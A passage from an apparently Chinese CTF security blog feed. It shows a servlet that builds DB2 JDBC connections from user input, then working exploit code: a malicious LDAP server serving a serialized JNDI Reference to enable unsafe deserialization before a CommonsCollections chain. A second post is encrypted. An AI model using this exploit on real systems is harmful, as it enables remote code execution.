class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-lang<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-lang<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- Use the appropriate version --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.ibm.db2.jcc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>db2jcc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>db2jcc4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后是访问的index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Test Connect Form&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Test Connect Form&lt;/h2&gt;<br>&lt;form action=<span class="hljs-string">&quot;TestDBConnection&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;connectionString&quot;</span>&gt;URL:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;connectionString&quot;</span> name=<span class="hljs-string">&quot;connectionString&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;Username:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;username&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;Password:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后是用于实际连接的java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(&quot;/TestDBConnection&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDBConnection</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">connectionString</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;connectionString&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 加载DB2 JDBC驱动</span><br>            Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br><br>            <span class="hljs-comment">// 尝试建立数据库连接</span><br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(connectionString, username, password);<br><br>            <span class="hljs-comment">// 如果成功连接，则输出成功消息</span><br>            out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h2&gt;连接成功!&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br><br>            <span class="hljs-comment">// 关闭连接</span><br>            connection.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;<br>            <span class="hljs-comment">// 如果连接失败，则输出错误消息</span><br>            out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h2&gt;连接失败!&lt;/h2&gt;&lt;p&gt;&quot;</span> + e.getMessage() + <span class="hljs-string">&quot;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-攻击利用"><a href="#0x03-攻击利用" class="headerlink" title="0x03 攻击利用"></a>0x03 攻击利用</h2><p>采用LDAP服务的方式进行利用，本地修改好代码，搭建一个文件托管服务，下面是</p><p>修改系统配置信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">userDN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=ldap;dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.setProperty(<span class="hljs-string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">imConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(userDN);<br>        imConfig.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<span class="hljs-number">1379</span>,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory)SSLSocketFactory.getDefault())<br>        );<br>        imConfig.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LdapInterpetor</span>());<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ldapServer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(imConfig);<br>        ldapServer.startListening();<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapInterpetor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">systemConfiguration</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;org.apache.commons.configuration.SystemConfiguration&quot;</span>,<span class="hljs-string">&quot;org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;SystemProperties&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:6666/system.txt&quot;</span>)); <span class="hljs-comment">//配置文件的地址</span><br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serializeObject(Serializable obj) &#123;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                 <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos)) &#123;<br>                oos.writeObject(obj);<br>                <span class="hljs-keyword">return</span> bos.toByteArray();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult request)</span> &#123;<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(request.getRequest().getBaseDN());<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.String&quot;</span>;<br>                entry.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, serializeObject(systemConfiguration()));<br>                entry.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>,className);<br>                entry.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>,<span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>                request.sendSearchEntry(entry);<br>                request.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>                System.out.println(<span class="hljs-string">&quot;stop&quot;</span>);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20231229214427117.png" alt="image-20231229214427117"></p><p>搭建一个文件托管(这里就直接用python)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p>配置文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.enableUnsafeSerialization=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>然后直接打CC3链子就行了</p>]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LimeSurvey GetShell</title>
    <link href="/2023/12/26/LimeSurvey_GetShell/"/>
    <url>/2023/12/26/LimeSurvey_GetShell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c036fc71fda7580ccb7e6fbe5ffb16d1cc8ebce9dde5b44ddca9ee78e7c7af6e">1174717c597af3f1f1c4d977105602bd54d885b99c4dae6f80bd5c3d6e9acc731656862a69be8aa6e45609d64e8628d1472ae82db18a5b77d62e0be0b68e92364b02f2c6207dd3f6c7fe7d507f490e30738be4e373e18233ae6d8be06de1bac9db3b129b1a8a5c04a18a41fb690b0ba9fdeacb98b2913fadf2863b9f93a485fae04b11a79b3b619cdbf4c83b8cab224644492ab9947a27a667e307a38e330ae1d6b95ee671dcfef95d903c32b4bb01ac1e3a35686e5462fda7c3865b00f614a76b1eb48884f43fe7c0031e70857b02461d02ad15d6329149cfcfff9c653968b0d8658d2c0ebc79029b279f05d1ff6093fa60fabcc22910195fe0173f05391391f6b9ea81e96f5e19690f11ef351afad5d7a4f4fe59ed9b5dc16772a777283c2e71ebb2d64a24ff9ff6905c4f16c58f229f63764342c3e4ebe8ec63094542a4174e3bab98777d869ec6b1372726ee1240cf06ac316c78794c127531ecba99e8a81741f054e45471da43e88d34feedef2651aa268f8bcb86fe9accb95eae360d692156af2b3fa5a180530c44176ae50a3d69df476feba53f7f4c4028ea2e809d04924d4399196fc0ba42fc9624fa06ecbd373f33c0b62ceeb668b29fbe53c7a2113b5ee3bdb96d897376cce6460ab3e3df56b360c9399db95a88f3cc0c711f9e96d67d31b18b1042d4fe6ace2a8f76ac6264acac3d2a37a55426158f54feeed22adcef09d569acc4dfcf0e2200596852b861bd589a3ddd84ceaa6909ccb20f31bb91076b2659b5c737d224a9fcb30286fd0e8cb8fa108a1ecdaf3a1a637ac50e67296a3e28fa09b69239ff5a5c5d75d9c0e65c0391a7478ed74d72708644bceff535a082cb759e7c14e3b41158f680abefdaea57b19d1e8e754b8a22857c715470f7097d2d5ce1c3cff433fcae450902051ff335bedcac77315c3a6ef4dffca3b94c1eded596017cb41bf25779d19ea54015847edfbc6fa7a04e13b7c8d4e2d3930a6b2e3fefced7a5fb10bec5d47e5d90b42dc4984dcf9607f0bcc4dd10cbd2d5fc8fbf011b9ca65f05193657d60a93179afe6a718021538cf48dc51ced877b135ff6c59014d63b14eb4c775b988d80d74adf1c99e52db2490840cbb267edc906e317a92d183d09dc1065d2a5f0106442b914dae8c8af3be774a34de6dcbf914c09b714d7f620e3988fcd645793ba161486787dab49eeed1948977251e299fd1c6556ad24ebe5f744ff9ce87d4193b7752ee084acc45f8670f43295b6877a5515903edc22d5f444c88d3525d123b258a6cb068c6b824aeeb6aab165a96cbf9a1693bc773a098b7bd718db8c7ec7af1c6c91460b8b3347cfb8cb54f5b5bf75fe090283c3a637845ec683bbfc9c37b69fba530641fc794e37e1fdbc62bba0e485d82a49ff826778145df8c2095317877beb9cb8f244633cf080f0f06d1dd0318f925b95cf1f1aa98abf6db9d1a0d32f752656f1d387d47e795d0fdad8ce44e8f4e601c51d54ee5dc4b61507ad63b5e1040eacfb3d7f5195d8d4629fc46908177623f467219ab060a6621ab38afcb6992e45e2c16b96ed381882c863c7a5426235fdb2056017d2e6dfa1ec029ae63c537ad4c2912d7d77ce86aa016a2e476c26aa63309dc6a4d33561d03f880f06eac8d7feb86ef63fe7508ceac4af777256f0605e62c003833e2fe60b9d31fa8729b8e85b663c743fa188549735625ad4641918f9a8b33407c853f6d84ef75b3c40daa0514ab04b88208bcde98d8d258618efe7e4bcd290e7a154045aad0acae27edaaf3634c1f975cbbdc726ed1bbb7cedced1ab935ef826089b34860552615223c581959a01ec9863a7a45699de3340aee74789a933118163b5666a4bf67cc8fd79343badc54feb85bdffc760941a455f4da13dab501685ee6ed41dbb29c82f1208b868e73b297fe24ed80f20dc617ca2935beab5a945b6c468a6d599c0a77fb1f241e7defc24b94df5f38f0b036e26d6e4f2f5859b3224f68e7e13f6d044d645163b204198cca1c1dcd124c4b9450d323f83d148d2ed45bd1a9c094c7495dd6d1ca83f28cae71c26962649e2c686077288c20b2a53b417d79a5a6293b4c510ae5fa11b6e6e15f60c01e50088ce6e696f6cfa5ecdb6501cdcca8b50e85cac85e648bb347a7726b25f6f3788a585c3f008ccace572d533116df460b33fe522839c897f0cddf829a73ca013fe5e9ee48aed2bd59d723f4d96f2baa0d43331ec925b1d5dd97e01d62ac1be168b92e69e4d0b249850da0aef6e945fb72be128c72346c8ea033872d0efe973875dd64363878574726d433835d0f46cbdaf173d54d70c4a6f37969b34725ec2cb581585dd606b1ee28eca98f96ee8985f72c9a74551a733efac67fa7ca31b9ae30987cf95ae87bc19cd9b043382c44205aa68a467203314ea44b4b0eef5957acca64fb21487651b37d08ff73cfe1155cb8583004dbc29af47cdd3054bb1a92ffc82badf18caa60be848e601e8bdec144369e68bb734b8894d43c236b080b23a7b031691023df196b2ae800164ecf4efdeff17eeb8c4c65d624f4109e2b0fb1db1fbda92f61b0a6725f027cc8b808d8bb2199de9b01a42913fd8f55a973307241434055543e6740b97938463e90b141aebc9ca2128ebfb00f351b95e1a6f50c3ec2556899e393fbf59765bcf2cdf6ced40503ebfe77d935be2712b889b4944b1b78c4300539a5da2a9485c574495ff8817854e1cebe3cac9b8bf0f257ec045a0613685f9dd64c233650a0091e19edd443cac23c4a840bef13f987b49ed352ef40ed9d05fd1aface02fd3fcdab6a131b48b613ce36f60dbf694c6c8b801c273af03eabd2b959d8a7a9cf3fc4e72fd5764f3a4f32181d4d53a984099cc3b53d91f2e0ec5e24fdbe134c76ce4f3c03b40c486f404a10970708aae042472c94fc75c5fab7d8dab883abc93fb5311b85130e9761111bc3aaf44e1522693c598d772129e5747ee3f8d6ca6d98650f27073b5c772583de42da6dc11b63e0bc676faca28f72b6a17e94f9c80a0835c1a79c59fd686d6c90eb0129f9668639b80ca3e4df8143c9be091e724139593f426463a9c47c7bf29a2436d3480a3ff63f6ba5f4ca9faa7b37e11b1bf53fcf20ab00f2a427ffd7cd1841f6ba818230f515f57d1c457eddd7447c27479a5528ba6f6ece08556847d3bc0279c883a743b83832701e4208c87fba7d64e5b52310d60c604b5487f3deb56d594cfafe32232a0a71253d93c7fba051f3a7196418c5168174f4dc8d1cad1f98305e50f384eda97f96e428dce575a6926a15b362d30073d7ae5cc1b8f3a478920488e092a76289006ff2fc27bcb03952f9f41322a503fb855abd848312e44542fb0e44d43201434b3196d2c2ca321e5d7a8e511ed27a41ba3f6a08eebde7543b8c7ffbd54a577b3ac42e51940b6ec01b1c9c42d8899282a8c2707c669a52702b78a7beab5b9f003bf11448947cd83fd4a5f8de579dc25c9a618e03cd2fdde33be211dfcd5fe2cb376bb08200dbcaffb320dd48e6cc97c36ef0636f373b3d19c3103a14394bbf715273f31f28d862a734dcfcacdb8e30ac90c5582f8d65fe7c95021aeda182056fc43cee4641ce4552a5ff7501852cc44450e9fd75363e2ca51a74930d56869c230cffc929cc542d54c05aacae80c0ff2da89e1a93d3f852c7b813e94bc40d0cb995c75e403c3fbfd399e564917dfc6e71630815c812572972412985a8f531c0a3e667285c1e33dfc255b0fd37b1750df6a3ac31886a8e70cd9e606a8f5ce3b20030218513d04fce150659aeab6628272060f42b1909b5b2a759e1e91b818cead7400e5f576c102abb0c25a411b828c978fb1ede22faac28f8eb6adcc826be1d4d664c53cb0bd25867d52acd579209ec8560f84c4d876c115ccb1ec06c490218e3437065c0a395f2e9f7e94ad8ffd26e12825fed9b45d52a019c33267d8c1f1585d03cdba9949ff74e098d20cac9684556872371e2a25f02d8ee4206f1501930220367d868618cd110d49095ac8f49b99024af6fe1029f5e8ee09ae270bff326bd205771a3c41f489a7993d9d41a39634c0ebe9a9779e96dd87ca70a06c4cab0b1cc13048366320cdbc71814bab82d25aa217595935b73359224b5b4c4351d1f837cac9a9626a5d35b6d3789d13e8363d832ead65652a3baba3190c107017bf551024ef2ff150a3876ac9b76a48350fef63643c07d1981891483555984dde0624ebc046619875b2fd7cf8d05ef979b8834ca47b684080c164180625e5fc3f3520f59b7127f175789e2eb7a52b278c2cfcbccf62e8bd34b772e0083c22cc15551bdd3c6d6431e2f3fb818247fe046db023a1bbfb9a17a3da188511c67fd7996dc4ca10ace2dc8fc3d27ccff07efd1ac6347e5c2e8b89cdfcc1e8c28a5e29cb1cef06f67a8e253621ab6a2e8aeceee25bcc1c40e53bc84696ffde88cd779d1ee88eceb6e3d43045d294516b8e2bd595bf857310b8099e5812daec1433f45c01dcb6af3eccdf9356a6ec4f68736555fbe81f5fbb129dcaa09f0f453c825a48500c1770661071bae3870814e79195313c84191af3950509afedba0b3141fb2587d0393687d7bfea770cc53f356fd7789ac512bb37314ca56cbfc58666b9544b582f8268129f28f7f4db5df79d2aaa751e78fd9bc1a414524f69e5102c23027f765e5492c817bd6f0d315667215d3cab68180d49db2e98c4cc25262547fa81871d158770744522d17cae9f54e95dfd4971910705793b0a72193aa321c640ae5d4cab6b9f9652a854b3268e2af84095ab40e67856f0aa7f55013a938a918bd6d77a1999cbf2f537f29f488610e681a869d2a931fa433c02e4e2fc1cc1fabfd2a1fc20b18496fc09e75594957a63534136ce6052a3af6812894b2a1446821b7d23098727c8a567fe78d4b6cbf12fd8274d423cd4ef232c70b415d46a3abf801e7836b4aa60325f54d1ef43e4d80d2d46e3104e0a8816c957a625c381efc021e13789d3254950ee9481e86dc0b07eb29f06c5515c428317c5d1c71b73a4fb6023acd86810a20e20163a22953d9b9be01852fec4dea1536915cceb596f338159d15e6d2b87a00c64dcc8fb17b2ce0179ece8e6e69f9b7f6bd647aea881a77a8881120611d896d17bdc1b4bb3768e79538ea2083f901fd8b31387408163891ca53699f0a967231641ebfd6e0b2c26c818d2c04e8541032ae4c7c165820efc404a0bafcbb4add12df8b8c82ad81c7243f7f3cabecbfd9c168c5fdaaf092a5580cee2f431e99cc743ca9b1cda9f678b34fba29d844dc672b9bd50bf463ab523b2e4353250d83966c9afc5f50f85e62b3487f91fbb8deeca304490e179ab5a7be2687702b7463b203e7eb871bd56917b4111d2f9d63c8488885d4dbaf523ed853948151989d0f7537496b27cd1bd18418dff40e336755527834da0658514740bbf30c939312695db638ee7ae10f4e6b82f6451bfe5a05b5eb4c48be25ba2f4faec5299e39096395cf863ca6ddb33901178033a9a7df45ea11160a991a8816ae86a60a2f6a13212f9b5535699fba1b62eace6699ce49e1359bc65a68148c33a5138d01b6eb7f676ef2f8f7136b9afaa4dfc3566b0e9f9561fa2a5b2fc096f53dcf57fb376bbc8e18fb7af56948ce21cbedff8e16aea8ecf1b1860b0cae1ddf10e07335030e90eb1827ba6b81188fc9452fa1d3333eb3748ea59c11d3d7086e75a53fbd830ddd50de36b9f872d284b06a373983762ec59744de3044ddf72ee06e4f082e0babb518510f7ef15081c348590cdf24b9c5725909d721876f793daf77bfe7f207f2a9c787ac73090d6c3242c8e14c27a1dc2bb7cc5794431ad59e29325e42cdbccfc36ab3e857bb2a9ce8918999b32dd3da794df36f01440de2695a0cd572c4cfe3cd99b588d91f71832eafe7bb728d8e8706a47fea304a2bfdd3ce90d388f81dc9c848073033092a9415d6dae844075f15236138722d9c199e5dfccec571af1ea42923339edbd99da117f4521aa58a897e5e2319eb54d3f50ee931b888732ae8fcb55bd1c8